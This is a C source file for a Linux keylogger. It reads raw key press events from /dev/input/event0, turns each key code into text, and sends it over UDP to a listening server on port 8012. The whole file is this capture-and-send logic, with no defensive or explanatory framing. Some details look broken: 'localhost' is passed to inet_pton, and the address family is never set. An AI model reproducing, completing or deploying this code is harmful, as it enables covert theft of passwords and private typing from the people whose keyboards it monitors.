#include <stdio.h>
#include <stdbool.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <unistd.h>
#include "str_from_events.h"

#define INTERFACE "/dev/input/event0"
#define PORT 8012

int main(int argc, char** argv) {
    // init /dev/input/event0
    FILE *fp = fopen(INTERFACE, "r");
    struct input_event keystroke;

    // init server addr
    struct sockaddr_in saddr;
    memset(&saddr, 0, sizeof(saddr));
    inet_pton(AF_INET, "localhost", &saddr.sin_addr);
    saddr.sin_port = htons(PORT);
    
    // create socket fd
    int sock= socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Couldn't socket");
        exit(1);
    }
    
    size_t bytes_read;
    printf("looking for keys\n");
    while ((bytes_read = fread(&keystroke, sizeof(struct input_event), 1, fp)) != 0) {
        // if correct type of input_event, send to server
        if (keystroke.type == 1 && keystroke.value == 1) {
            char *keycode = keycode_to_str(keystroke.code);
            int msg_len = sendto(sock, keycode, strlen(keycode), 0, 
                          (struct sockaddr *) &saddr, sizeof(saddr));
            free(keycode);
        }
    }
    close(sock);
    fclose(fp);
}

